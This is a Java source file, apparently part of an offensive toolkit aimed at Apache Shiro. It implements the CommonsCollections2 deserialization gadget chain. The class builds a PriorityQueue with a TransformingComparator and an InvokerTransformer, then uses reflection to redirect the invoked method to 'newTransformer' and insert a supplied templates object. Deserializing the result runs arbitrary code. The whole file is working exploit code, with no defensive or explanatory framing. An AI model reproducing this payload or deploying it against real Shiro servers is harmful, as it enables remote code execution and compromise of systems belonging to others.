package com.liev.clouds.payload.shiro;

import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;


@Dependencies({"org.apache.commons:commons-collections4:4.0"})
public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object templates) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);


        PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)new TransformingComparator((Transformer)transformer));

        queue.add(Integer.valueOf(1));
        queue.add(Integer.valueOf(1));


        ReflectionsUtils.setFieldValue(transformer, "iMethodName", "newTransformer");


        Object[] queueArray = (Object[])ReflectionsUtils.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = Integer.valueOf(1);

        return queue;
    }
}


